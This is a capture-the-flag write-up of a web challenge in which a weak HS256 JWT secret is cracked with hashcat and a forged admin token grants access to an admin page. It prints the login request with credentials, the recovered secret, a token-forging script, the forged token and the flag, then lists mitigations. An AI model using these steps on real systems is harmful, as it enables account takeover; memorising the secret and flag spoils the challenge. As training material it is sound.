# JWT Weak Secret → Admin Privilege Escalation (Global Truth Bank)

# JWT Weak Secret → Admin Privilege Escalation

- **CTF:** Cyber Premier League (Web)
- **Challenge:** Global Truth Bank
- **Target:** `labs.ctfzone.com:6121`
- **Author:** Tito Oscar (T1t0D3vS3c)

---

## Overview

This challenge demonstrates how a **weak JWT (HS256) signing secret** can allow an attacker to **forge tokens** and escalate privileges to access an **admin-only endpoint**.

In this scenario, the application stored a JWT in a cookie and used a client-controlled claim (`isAdmin`) to make authorization decisions. After cracking the signing secret, it was possible to generate a new token with admin privileges and retrieve the flag.

> Educational use only: this writeup is intended for CTF practice and learning.

---

## Objective

- Capture the JWT stored in the `authToken` cookie.
- Confirm the JWT is signed with **HS256**.
- Crack the JWT signing secret using a wordlist attack.
- Forge a new JWT with `isAdmin: true`.
- Access the admin endpoint and retrieve the flag.

---

## 1) Initial Login & Token Capture (Burp Suite)

After logging in as a normal user, the request and response were intercepted using **Burp Suite Proxy**.

### HTTP Request

```
POST /login HTTP/1.1
Host: labs.ctfzone.com:6121
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

username=clemence&password=snf%26%26ctfzonepass%402026
```

### HTTP Response

```
HTTP/1.1 302 Found
Set-Cookie: authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiY2xlbWVuY2UiLCJpc0FkbWluIjpmYWxzZSwiYmFsYW5jZSI6MzAwMCwiaWF0IjoxNzcxNzkzMzQ3LCJleHAiOjE3NzE3OTY5NDd9.6DG-gLVV8s0vfSVgIOsYp0DIZQ5QgxKplVttz2nkaqk
Location: /dashboard
```

### Key Observations

- JWT is stored in a cookie named: `authToken`
- Algorithm: `HS256`
- Payload includes an authorization-related claim: `"isAdmin": false`

---

## 2) JWT Analysis

A JWT is made of three parts:

```
HEADER.PAYLOAD.SIGNATURE
```

The payload section was Base64-decoded to inspect its claims.

### Decode Payload

```bash
echo "eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiY2xlbWVuY2UiLCJpc0FkbWluIjpmYWxzZSwiYmFsYW5jZSI6MzAwMCwiaWF0IjoxNzcxNzkzMzQ3LCJleHAiOjE3NzE3OTY5NDd9" | base64 -d
```

### Output

```json
{
  "userId": 2,
  "username": "clemence",
  "isAdmin": false,
  "balance": 3000,
  "iat": 1771793347,
  "exp": 1771796947
}
```

### Vulnerability

The application trusted the `isAdmin` claim in a **client-controlled** JWT.

Since the token used **HS256**, the same shared secret is used to both sign and verify tokens. If the secret is weak, it can be cracked offline and used to forge valid tokens.

---

## 3) Preparing the Token for Cracking

The full JWT was saved into a file for Hashcat.

```bash
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoiY2xlbWVuY2UiLCJpc0FkbWluIjpmYWxzZSwiYmFsYW5jZSI6MzAwMCwiaWF0IjoxNzcxNzkzMzQ3LCJleHAiOjE3NzE3OTY5NDd9.6DG-gLVV8s0vfSVgIOsYp0DIZQ5QgxKplVttz2nkaqk" > token.txt
```

---

## 4) Wordlist Preparation (Kali Linux)

The `rockyou.txt` wordlist is commonly compressed by default on Kali.

```bash
sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
```

---

## 5) Cracking the JWT Secret (Hashcat)

Hashcat mode `16500` is used for **JWT (HS256)**.

```bash
hashcat -m 16500 token.txt /usr/share/wordlists/rockyou.txt
```

### Result

Hashcat recovered the signing secret:

```
n1c2a3h4t5l6i7e890r
```

This confirms the application was using a weak JWT signing key.

---

## 6) Forging an Admin Token

With the secret known, a new JWT was generated where `isAdmin` was set to `true`.

### exploit.py

```python
import jwt

secret = "n1c2a3h4t5l6i7e890r"

payload = {
    "userId": 1,
    "username": "admin",
    "isAdmin": True,
    "balance": 999999
}

token = jwt.encode(payload, secret, algorithm="HS256")
print(token)
```

### Execute

```bash
python3 exploit.py
```

### Generated Admin Token

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJiYWxhbmNlIjo5OTk5OTl9.bDScCEn0gugILRPwfh5kv3G0ssIp9d3dPb-7DFQj1PU
```

Because the token was signed with the correct secret, the server accepted it.

---

## 7) Replacing the JWT Cookie and Accessing `/admin`

Using **Burp Repeater**, the cookie was replaced with the forged token.

```
GET /admin HTTP/1.1
Host: labs.ctfzone.com:6121
Cookie: authToken=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInVzZXJuYW1lIjoiYWRtaW4iLCJpc0FkbWluIjp0cnVlLCJiYWxhbmNlIjo5OTk5OTl9.bDScCEn0gugILRPwfh5kv3G0ssIp9d3dPb-7DFQj1PU
Connection: keep-alive
```

---

## 8) Flag

Access was granted and the flag was revealed:

```
snf{JWT_cr4ck3d_4dm1n_4cc3ss_gr4nt3d_458734659457}
```

---

## Root Cause

The privilege escalation was possible due to:

- A **weak HS256 secret** (crackable via wordlist attack)
- Trusting `isAdmin` in a client-controlled JWT
- Lack of server-side role validation
- No key rotation strategy

---

## What This Challenge Tested

- JWT structure (header, payload, signature)
- Base64 decoding
- HS256 signing and shared-secret risk
- Hashcat usage (`-m 16500`)
- Token forgery for privilege escalation

---

## Final Attack Flow (Summary)

1. Log in as a normal user
2. Capture JWT from `Set-Cookie`
3. Decode payload
4. Identify `HS256`
5. Crack signing secret using Hashcat
6. Forge a new JWT with `"isAdmin": true`
7. Replace the cookie
8. Access `/admin`
9. Retrieve the flag

---

## Security Lessons (Mitigations)

- Use strong, random secrets (at least 256-bit) for HMAC-based JWTs.
- Prefer asymmetric signing (for example, `RS256`) when appropriate.
- Never rely on client-controlled claims for authorization.
- Rotate secrets and monitor for abnormal token usage.

---

## Conclusion

This was a classic **JWT weak-secret privilege escalation** challenge. After recovering the HS256 signing secret, a forged admin token could be generated and used to access the admin endpoint and retrieve the flag.
